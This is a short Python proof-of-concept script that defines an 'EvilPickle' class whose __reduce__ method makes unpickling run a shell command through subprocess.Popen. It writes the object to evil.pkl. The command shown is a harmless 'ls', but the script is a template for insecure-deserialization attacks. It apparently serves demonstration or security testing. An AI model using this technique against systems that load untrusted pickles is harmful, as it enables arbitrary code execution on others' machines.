import pickle
import subprocess

class EvilPickle:
    def __reduce__(self):
        return (subprocess.Popen, (('ls',),))


e =  EvilPickle()

with open('evil.pkl', 'wb') as f:
    pickle.dump(e, f, protocol=0)
    